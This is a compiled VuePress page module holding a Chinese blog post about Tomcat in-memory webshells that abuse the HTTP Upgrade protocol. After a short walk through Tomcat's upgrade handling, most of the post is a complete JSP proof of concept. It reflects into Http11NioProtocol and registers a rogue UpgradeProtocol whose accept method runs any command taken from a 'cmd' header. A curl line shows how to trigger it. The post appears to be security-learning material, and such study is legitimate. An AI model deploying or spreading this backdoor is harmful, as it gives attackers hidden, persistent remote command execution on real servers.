import{_ as n}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as a,a as e,o as i}from"./app-DS0ZCcmM.js";const p={};function l(t,s){return i(),a("div",null,s[0]||(s[0]=[e(`<h1 id="upgrade" tabindex="-1"><a class="header-anchor" href="#upgrade"><span>Upgrade</span></a></h1><h2 id="upgrade-1" tabindex="-1"><a class="header-anchor" href="#upgrade-1"><span>Upgrade</span></a></h2><p>推荐先看<a href="https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09" target="_blank" rel="noopener noreferrer">Tomcat 架构原理解析到架构设计借鉴</a></p><p>先来看下UpgradeProtocol这个接口</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240710172248091.png" alt="image-20240710172248091" tabindex="0" loading="lazy"><figcaption>image-20240710172248091</figcaption></figure><p>从实际应用上来说，这个接口被用于对请求的处理,处理connection: upgrade字段</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240710172612068.png" alt="image-20240710172612068" tabindex="0" loading="lazy"><figcaption>image-20240710172612068</figcaption></figure><h3 id="调用分析" tabindex="-1"><a class="header-anchor" href="#调用分析"><span>调用分析</span></a></h3><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240710173648561.png" alt="image-20240710173648561" tabindex="0" loading="lazy"><figcaption>image-20240710173648561</figcaption></figure><ul><li><p>AbstractProcessorLight</p><p>process方法，方法下会根据当前SocketState进行对应的相应处理，调用相应的Processor进行处理，在处理HTTP请求时，对应的Processor为Http11Processor</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240710173835544.png" alt="image-20240710173835544" tabindex="0" loading="lazy"><figcaption>image-20240710173835544</figcaption></figure></li><li><p>Http11Processor</p><p>在service方法中存在if判断</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240710174256671.png" alt="image-20240710174256671" tabindex="0" loading="lazy"><figcaption>image-20240710174256671</figcaption></figure><p>首先判断当前connection请求头是否为upgrade,如果是upgrade则获取请求头Upgrade字段的值，根据该值调用getUpgradeProtocol方法获取upgradeProtocol对象，并调用气accept方法</p><p>跟进getUpgradeProtocol</p></li><li><p>AbstractHttp11Protocol</p><p>getUpgradeProtocol()</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240710175258217.png" alt="image-20240710175258217" tabindex="0" loading="lazy"><figcaption>image-20240710175258217</figcaption></figure><p>httpUpgradeProtocols是一个hash表，通过键对值存储数据，这里获取到对应值的upgradeProtocol对象</p><p>跟进到httpUpgradeProtocols是如何进行赋值的</p><p>configureUpgradeProtocol()</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240710180911934.png" alt="image-20240710180911934" tabindex="0" loading="lazy"><figcaption>image-20240710180911934</figcaption></figure><p>在该方法下执行了相应的put,朝hash表中添加了值</p><p>该字段位于request.connector.protocolHandler.httpUpgradeProtocols</p></li></ul><h3 id="poc编写" tabindex="-1"><a class="header-anchor" href="#poc编写"><span>POC编写</span></a></h3><p>我们的目标是获取Http11NioProcol对象，获取httpUpgradeProtocols表并向其中添加恶意类</p><p>1.获取Http11NioProcol对象</p><div class="language-jsp line-numbers-mode" data-highlighter="shiki" data-ext="jsp" data-title="jsp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>&lt;%</span></span>
<span class="line"><span>    //反射获取request对象</span></span>
<span class="line"><span>    Field reF = request.getClass().getDeclaredField(&quot;request&quot;);</span></span>
<span class="line"><span>    reF.setAccessible(true);</span></span>
<span class="line"><span>    Request reQ = (Request) reF.get(request);</span></span>
<span class="line"><span>    //获取connector</span></span>
<span class="line"><span>    Field coN = reQ.getClass().getDeclaredField(&quot;connector&quot;);</span></span>
<span class="line"><span>    coN.setAccessible(true);</span></span>
<span class="line"><span>    Connector connector = (Connector) coN.get(reQ);</span></span>
<span class="line"><span>    //获取Http11NioProtocol对象</span></span>
<span class="line"><span>    Field proH = connector.getClass().getDeclaredField(&quot;protocolHandler&quot;);</span></span>
<span class="line"><span>    proH.setAccessible(true);</span></span>
<span class="line"><span>    Http11NioProtocol http11NioProtocol = (Http11NioProtocol) proH.get(connector);</span></span>
<span class="line"><span>%&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>2.编写恶意的upgrade类</p><div class="language-jsp line-numbers-mode" data-highlighter="shiki" data-ext="jsp" data-title="jsp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>&lt;%</span></span>
<span class="line"><span>    //实现恶意的upgrade</span></span>
<span class="line"><span>    class shell_upgrade implements UpgradeProtocol {</span></span>
<span class="line"><span></span></span>
<span class="line"><span>        @Override</span></span>
<span class="line"><span>        public String getHttpUpgradeName(boolean b) {</span></span>
<span class="line"><span>            return null;</span></span>
<span class="line"><span>        }</span></span>
<span class="line"><span></span></span>
<span class="line"><span>        @Override</span></span>
<span class="line"><span>        public byte[] getAlpnIdentifier() {</span></span>
<span class="line"><span>            return new byte[0];</span></span>
<span class="line"><span>        }</span></span>
<span class="line"><span></span></span>
<span class="line"><span>        @Override</span></span>
<span class="line"><span>        public String getAlpnName() {</span></span>
<span class="line"><span>            return null;</span></span>
<span class="line"><span>        }</span></span>
<span class="line"><span></span></span>
<span class="line"><span>        @Override</span></span>
<span class="line"><span>        public Processor getProcessor(SocketWrapperBase&lt;?&gt; socketWrapperBase, Adapter adapter) {</span></span>
<span class="line"><span>            return null;</span></span>
<span class="line"><span>        }</span></span>
<span class="line"><span></span></span>
<span class="line"><span>        @Override</span></span>
<span class="line"><span>        public InternalHttpUpgradeHandler getInternalUpgradeHandler(SocketWrapperBase&lt;?&gt; socketWrapperBase, Adapter adapter, org.apache.coyote.Request request) {</span></span>
<span class="line"><span>            return null;</span></span>
<span class="line"><span>        }</span></span>
<span class="line"><span></span></span>
<span class="line"><span>        @Override</span></span>
<span class="line"><span>        public boolean accept(org.apache.coyote.Request request) {</span></span>
<span class="line"><span>            String cmd = request.getHeader(&quot;cmd&quot;);</span></span>
<span class="line"><span>            if(cmd != null){</span></span>
<span class="line"><span>                try {</span></span>
<span class="line"><span>                    Runtime.getRuntime().exec(cmd);</span></span>
<span class="line"><span>                } catch (IOException e) {</span></span>
<span class="line"><span>                    throw new RuntimeException(e);</span></span>
<span class="line"><span>                }</span></span>
<span class="line"><span>            }</span></span>
<span class="line"><span>            return false;</span></span>
<span class="line"><span>        }</span></span>
<span class="line"><span>    }</span></span>
<span class="line"><span>%&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这里只弹一个计算机，如果要回显需要自己获取response</p><p>3.反射获取httpUpgradeProtocols,注入恶意类</p><div class="language-jsp line-numbers-mode" data-highlighter="shiki" data-ext="jsp" data-title="jsp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>&lt;%</span></span>
<span class="line"><span>    //创建一个hashmap并将恶意对象进行反射添加</span></span>
<span class="line"><span>    HashMap&lt;String, UpgradeProtocol&gt; upgradeProtocols = null;</span></span>
<span class="line"><span>    shell_upgrade shellUpgrade = new shell_upgrade();</span></span>
<span class="line"><span>	//这里需要注意，不要用错了</span></span>
<span class="line"><span>    Field putI = AbstractHttp11Protocol.class.getDeclaredField(&quot;httpUpgradeProtocols&quot;);</span></span>
<span class="line"><span>    putI.setAccessible(true);</span></span>
<span class="line"><span>    upgradeProtocols = (HashMap&lt;String, UpgradeProtocol&gt;) putI.get(http11NioProtocol);</span></span>
<span class="line"><span>    upgradeProtocols.put(&quot;uu2fu3o&quot;,shellUpgrade);</span></span>
<span class="line"><span>    putI.set(http11NioProtocol,upgradeProtocols);</span></span>
<span class="line"><span>    //curl -H &quot;Connection: Upgrade&quot; -H &quot;Upgrade: uu2fu3o&quot; -H &quot;cmd: calc&quot; http://localhost:8080/</span></span>
<span class="line"><span>%&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240711112127152.png" alt="image-20240711112127152" tabindex="0" loading="lazy"><figcaption>image-20240711112127152</figcaption></figure><p>完整POC</p><div class="language-jsp line-numbers-mode" data-highlighter="shiki" data-ext="jsp" data-title="jsp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;org.apache.catalina.connector.Connector&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;r</span></span>
<span class="line"><span>&lt;%@ page import=&quot;org.apache.coyote.http11.Http11NioProtocol&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;org.apache.coyote.UpgradeProtocol&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;org.apache.coyote.Processor&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;org.apache.tomcat.util.net.SocketWrapperBase&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;org.apache.coyote.Adapter&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;java.util.HashMap&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;org.apache.coyote.http11.AbstractHttp11Protocol&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span></span>
<span class="line"><span>&lt;%--</span></span>
<span class="line"><span>  Created by IntelliJ IDEA.</span></span>
<span class="line"><span>  User: Administrator</span></span>
<span class="line"><span>  Date: 2024/7/11</span></span>
<span class="line"><span>  Time: 9:50</span></span>
<span class="line"><span>  To change this template use File | Settings | File Templates.</span></span>
<span class="line"><span>--%&gt;</span></span>
<span class="line"><span>&lt;%</span></span>
<span class="line"><span>    //反射获取request对象</span></span>
<span class="line"><span>    Field reF = request.getClass().getDeclaredField(&quot;request&quot;);</span></span>
<span class="line"><span>    reF.setAccessible(true);</span></span>
<span class="line"><span>    Request reQ = (Request) reF.get(request);</span></span>
<span class="line"><span>    //获取connector</span></span>
<span class="line"><span>    Field coN = reQ.getClass().getDeclaredField(&quot;connector&quot;);</span></span>
<span class="line"><span>    coN.setAccessible(true);</span></span>
<span class="line"><span>    Connector connector = (Connector) coN.get(reQ);</span></span>
<span class="line"><span>    //获取Http11NioProtocol对象</span></span>
<span class="line"><span>    Field proH = connector.getClass().getDeclaredField(&quot;protocolHandler&quot;);</span></span>
<span class="line"><span>    proH.setAccessible(true);</span></span>
<span class="line"><span>    Http11NioProtocol http11NioProtocol = (Http11NioProtocol) proH.get(connector);</span></span>
<span class="line"><span>%&gt;</span></span>
<span class="line"><span>&lt;%</span></span>
<span class="line"><span>    //实现恶意的upgrade</span></span>
<span class="line"><span>    class shell_upgrade implements UpgradeProtocol {</span></span>
<span class="line"><span></span></span>
<span class="line"><span>        @Override</span></span>
<span class="line"><span>        public String getHttpUpgradeName(boolean b) {</span></span>
<span class="line"><span>            return null;</span></span>
<span class="line"><span>        }</span></span>
<span class="line"><span></span></span>
<span class="line"><span>        @Override</span></span>
<span class="line"><span>        public byte[] getAlpnIdentifier() {</span></span>
<span class="line"><span>            return new byte[0];</span></span>
<span class="line"><span>        }</span></span>
<span class="line"><span></span></span>
<span class="line"><span>        @Override</span></span>
<span class="line"><span>        public String getAlpnName() {</span></span>
<span class="line"><span>            return null;</span></span>
<span class="line"><span>        }</span></span>
<span class="line"><span></span></span>
<span class="line"><span>        @Override</span></span>
<span class="line"><span>        public Processor getProcessor(SocketWrapperBase&lt;?&gt; socketWrapperBase, Adapter adapter) {</span></span>
<span class="line"><span>            return null;</span></span>
<span class="line"><span>        }</span></span>
<span class="line"><span></span></span>
<span class="line"><span>        @Override</span></span>
<span class="line"><span>        public InternalHttpUpgradeHandler getInternalUpgradeHandler(SocketWrapperBase&lt;?&gt; socketWrapperBase, Adapter adapter, org.apache.coyote.Request request) {</span></span>
<span class="line"><span>            return null;</span></span>
<span class="line"><span>        }</span></span>
<span class="line"><span></span></span>
<span class="line"><span>        @Override</span></span>
<span class="line"><span>        public boolean accept(org.apache.coyote.Request request) {</span></span>
<span class="line"><span>            String cmd = request.getHeader(&quot;cmd&quot;);</span></span>
<span class="line"><span>            if(cmd != null){</span></span>
<span class="line"><span>                try {</span></span>
<span class="line"><span>                    Runtime.getRuntime().exec(cmd);</span></span>
<span class="line"><span>                } catch (IOException e) {</span></span>
<span class="line"><span>                    throw new RuntimeException(e);</span></span>
<span class="line"><span>                }</span></span>
<span class="line"><span>            }</span></span>
<span class="line"><span>            return false;</span></span>
<span class="line"><span>        }</span></span>
<span class="line"><span>    }</span></span>
<span class="line"><span>%&gt;</span></span>
<span class="line"><span>&lt;%</span></span>
<span class="line"><span>    //创建一个hashmap并将恶意对象进行反射添加</span></span>
<span class="line"><span>    HashMap&lt;String, UpgradeProtocol&gt; upgradeProtocols = null;</span></span>
<span class="line"><span>    shell_upgrade shellUpgrade = new shell_upgrade();</span></span>
<span class="line"><span>    Field putI = AbstractHttp11Protocol.class.getDeclaredField(&quot;httpUpgradeProtocols&quot;);</span></span>
<span class="line"><span>    putI.setAccessible(true);</span></span>
<span class="line"><span>    upgradeProtocols = (HashMap&lt;String, UpgradeProtocol&gt;) putI.get(http11NioProtocol);</span></span>
<span class="line"><span>    upgradeProtocols.put(&quot;uu2fu3o&quot;,shellUpgrade);</span></span>
<span class="line"><span>    putI.set(http11NioProtocol,upgradeProtocols);</span></span>
<span class="line"><span>    //curl -H &quot;Connection: Upgrade&quot; -H &quot;Upgrade: uu2fu3o&quot; -H &quot;cmd: calc&quot; http://localhost:8080/</span></span>
<span class="line"><span>%&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,22)]))}const o=n(p,[["render",l],["__file","Upgrade.html.vue"]]),d=JSON.parse('{"path":"/Java%E5%AD%A6%E4%B9%A0/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat/Upgrade.html","title":"Upgrade","lang":"zh-CN","frontmatter":{"description":"Upgrade Upgrade 推荐先看Tomcat 架构原理解析到架构设计借鉴 先来看下UpgradeProtocol这个接口 image-20240710172248091image-20240710172248091 从实际应用上来说，这个接口被用于对请求的处理,处理connection: upgrade字段 image-202407101726...","head":[["meta",{"property":"og:url","content":"https://mister-hope.github.io/articles/Java%E5%AD%A6%E4%B9%A0/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat/Upgrade.html"}],["meta",{"property":"og:site_name","content":"uu2fu3o的知识库"}],["meta",{"property":"og:title","content":"Upgrade"}],["meta",{"property":"og:description","content":"Upgrade Upgrade 推荐先看Tomcat 架构原理解析到架构设计借鉴 先来看下UpgradeProtocol这个接口 image-20240710172248091image-20240710172248091 从实际应用上来说，这个接口被用于对请求的处理,处理connection: upgrade字段 image-202407101726..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:image","content":"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240710172248091.png"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-01-15T18:41:02.000Z"}],["meta",{"property":"article:modified_time","content":"2025-01-15T18:41:02.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"Upgrade\\",\\"image\\":[\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240710172248091.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240710172612068.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240710173648561.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240710173835544.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240710174256671.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240710175258217.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240710180911934.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240711112127152.png\\"],\\"dateModified\\":\\"2025-01-15T18:41:02.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"uu2fu3o\\",\\"url\\":\\"https://mister-hope.com\\"}]}"]]},"headers":[{"level":2,"title":"Upgrade","slug":"upgrade-1","link":"#upgrade-1","children":[{"level":3,"title":"调用分析","slug":"调用分析","link":"#调用分析","children":[]},{"level":3,"title":"POC编写","slug":"poc编写","link":"#poc编写","children":[]}]}],"git":{"createdTime":1736966462000,"updatedTime":1736966462000,"contributors":[{"name":"uu2fu3o","username":"uu2fu3o","email":"1027578439@qq.com","commits":1,"url":"https://github.com/uu2fu3o"}]},"readingTime":{"minutes":2.81,"words":843},"filePathRelative":"Java学习/内存马/Tomcat/Upgrade.md","localizedDate":"2025年1月16日","excerpt":"\\n<h2>Upgrade</h2>\\n<p>推荐先看<a href=\\"https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">Tomcat 架构原理解析到架构设计借鉴</a></p>\\n<p>先来看下UpgradeProtocol这个接口</p>\\n<figure><img src=\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240710172248091.png\\" alt=\\"image-20240710172248091\\" tabindex=\\"0\\" loading=\\"lazy\\"><figcaption>image-20240710172248091</figcaption></figure>","autoDesc":true}');export{o as comp,d as data};
